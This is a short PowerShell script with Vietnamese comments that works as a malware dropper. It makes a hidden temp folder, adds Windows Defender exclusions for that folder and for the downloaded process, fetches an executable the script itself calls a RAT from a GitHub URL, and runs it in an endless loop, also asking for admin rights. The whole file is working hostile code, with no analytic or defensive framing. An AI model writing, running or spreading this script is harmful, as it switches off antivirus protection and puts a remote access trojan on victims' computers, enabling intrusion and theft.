$systemPath = [System.IO.Path]::Combine($env:temp, "SystemTemp")
New-Item -Path $systemPath -ItemType Directory -Force

Add-MpPreference -ExclusionPath $systemPath

$ratUrl = "https://github.com/minhdmkk6/t2/raw/refs/heads/main/XClient.exe"
$ratPath = [System.IO.Path]::Combine($systemPath, "macro.exe")

Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath

Add-MpPreference -ExclusionProcess $ratPath

while ($true) {
    if (-not (Get-Process -Name "macro" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $ratPath   # Chạy bình thường
        Start-Process -FilePath $ratPath -Verb RunAs  # Chạy với quyền admin
    }
    Start-Sleep -Seconds 32
}
